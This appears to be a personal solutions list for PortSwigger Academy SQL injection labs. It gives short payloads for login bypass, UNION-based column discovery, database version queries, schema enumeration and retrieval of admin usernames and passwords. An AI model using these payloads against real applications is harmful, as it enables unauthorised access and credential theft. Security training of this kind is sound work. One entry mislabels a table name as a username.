
# Portswigger

### SQL Injection 

##### 1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data 

**payload**: `filter?category=Gifts'+OR+1+=+1--` 

##### 2. SQL injection vulnerability allowing login bypass 

**payload**: `password: ' OR 1=1--` 

##### 3. SQL injection UNION attack, determining the number of coulmns returned by the query 

**payload**: `filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL--` 

##### 4. SQL injection UNION attack, finding a coulmn containing text 

**payload**: `filter?category=Pets'+UNION+SELECT+NULL,'YK6gYm',NULL--` 

##### 5. SQL injection UNION attack, retrieving data from other tables 

**payload**: `filter?category=Gifts'+UNION+SELECT+username,password+FROM+users--` 
This will give the Password of user admin. 

##### 6. SQL injection UNION attack, retrieving multiple values in a single column 

**payload**: `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--` 
This will give the password for user admin. 

##### 7. SQL injection attack, querying the database type and version on Oracle 

**payload**: `Pets%'+UNION+SELECT+BANNER,+NULL+FROM+v$version--` 
This will leak the database version. 

##### 8. SQL injection attack, querying the database type and version on MySQL and Microsoft 

**payload**: `'+UNION+SELECT+@@version,+NULL#` 

##### 9. SQL injection attack, listing the database contents on non-Oracle databases 

1) `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--` will give the username `users_qjqsdw`.  
2) `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_qjqsdw'--  
` will give `password_tmajay` and  `username_mwfumq`  
3) `' UNION SELECT username_mwfumq, password_tmajay FROM users_qjqsdw--` will give the admin creds.  

##### 10. SQL injection attack, listing the database contents on Oracle 

**payload**: `' UNION SELECT USERNAME_MUNMCB, PASSWORD_QYRMVB FROM USERS_VLOTNP--` 

This will give the creds of admin. 
